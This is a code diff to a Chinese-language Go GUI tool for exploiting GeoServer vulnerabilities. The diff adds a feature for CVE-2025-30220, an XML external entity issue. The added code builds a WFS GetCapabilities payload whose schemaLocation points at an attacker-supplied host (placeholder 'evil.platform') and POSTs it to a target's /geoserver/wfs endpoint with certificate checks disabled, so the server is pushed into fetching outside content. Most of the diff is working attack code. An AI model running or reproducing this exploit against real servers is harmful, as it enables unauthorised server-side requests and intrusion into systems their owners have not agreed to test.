@@ -21,7 +21,53 @@ import (
 var proxyURL *url.URL
 var proxyLabel *widget.Label // 全局变量，用于显示代理设置
 
-// 代理设置窗口
+// CVE-2025-30220漏洞利用
+func XXE() {
+	//新窗口
+	newWindow := fyne.CurrentApp().NewWindow("CVE-2025-30220漏洞验证")
+	//输入框
+	newEntry := widget.NewEntry()
+	newEntry.SetPlaceHolder("请输入目标URL，如http://192.168.51.225:8080/")
+	newEntry2 := widget.NewEntry()
+	newEntry2.SetPlaceHolder("请输入URL，如http://evil.platform/或http://evil.platform/1.xsd")
+	outputMultiLine := widget.NewMultiLineEntry()
+	outputMultiLine.Wrapping = fyne.TextWrapWord
+	scroll := container.NewScroll(outputMultiLine)
+	scroll.SetMinSize(fyne.NewSize(800, 300))
+	newButton := widget.NewButton("执行漏洞验证", func() {
+		go func() {
+			targetURL := newEntry.Text + "/geoserver/wfs"
+			evilURL := newEntry2.Text
+			if targetURL == "" || evilURL == "" {
+				// UI 更新必须在主线程中执行
+				fyne.CurrentApp().SendNotification(&fyne.Notification{
+					Title:   "参数错误",
+					Content: "请确保所有字段都已填写",
+				})
+				return
+			}
+
+			result, status_code, err := exploit2(targetURL, evilURL)
+			if err != nil {
+				outputMultiLine.SetText(fmt.Sprintf("执行失败: %s", err))
+			} else {
+				outputMultiLine.SetText(fmt.Sprintf("漏洞验证结果:\n%s\n%s", status_code, result))
+			}
+		}()
+	})
+	content := container.NewVBox(
+		widget.NewLabel("输入目标地址："),
+		newEntry,
+		widget.NewLabel("输入外部xsd文件的URL："),
+		newEntry2,
+		newButton,
+		scroll,
+	)
+	newWindow.SetContent(content)
+	newWindow.Resize(fyne.NewSize(800, 400))
+	newWindow.Show()
+}
+
 func proxySettingsWindow() {
 	// 新窗口
 	proxyWindow := fyne.CurrentApp().NewWindow("设置代理")
@@ -76,6 +122,67 @@ func proxySettingsWindow() {
 	proxyWindow.SetContent(content)
 	proxyWindow.Resize(fyne.NewSize(400, 200))
 	proxyWindow.Show()
+}
+
+// 修正版 exploit2：发送符合示例的 POST XML 请求（支持全局 proxyURL）
+func exploit2(targetURL, evilURL string) (string, string, error) {
+	// 拆分 evilURL：去掉结尾的 .xsd 文件作为第一个 URL
+	firstURL := evilURL
+	if strings.HasSuffix(evilURL, ".xsd") {
+		if idx := strings.LastIndex(evilURL, "/"); idx != -1 {
+			firstURL = evilURL[:idx]
+		}
+	}
+
+	// 构造 payload
+	payload := fmt.Sprintf(`<wfs:GetCapabilities
+    service="WFS"
+    version="1.0.0"
+    xmlns:wfs="http://www.opengis.net/wfs"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xsi:schemaLocation="%s %s">
+</wfs:GetCapabilities>`, firstURL, evilURL)
+
+	// 创建HTTP POST请求
+	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(payload)))
+	if err != nil {
+		return "", "", err
+	}
+
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0")
+	req.Header.Set("Content-Type", "text/xml")
+	req.Header.Set("Accept", "*/*")
+	req.Header.Set("Accept-Encoding", "gzip, deflate")
+	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
+	req.Header.Set("Cache-Control", "no-cache")
+	req.Header.Set("Pragma", "no-cache")
+	req.Header.Set("DNT", "1")
+
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	if proxyURL != nil {
+		tr.Proxy = http.ProxyURL(proxyURL)
+	}
+	client := &http.Client{
+		Transport: tr,
+		Timeout:   10 * time.Second,
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", "", err
+	}
+	defer resp.Body.Close()
+
+	// 读取响应
+	body, err := ioutil.ReadAll(resp.Body)
+	status_code := resp.Status
+	if err != nil {
+		return "", "", err
+	}
+
+	return string(body), status_code, nil
 }
 
 // 漏洞利用函数，向GeoServer发送恶意请求
@@ -360,9 +467,15 @@ func main() {
 		proxySettingsWindow()
 	})
 
+	//CVE-2025-30220
+	xxeButton := widget.NewButton("CVE-2025-30220漏洞验证", func() {
+		XXE()
+	})
+
 	// 布局
 	content := container.NewVBox(
 		widget.NewLabel("CVE-2024-36401 漏洞验证工具"),
+		xxeButton,
 		proxyButton,
 		urlEntry,
 		domainEntry,
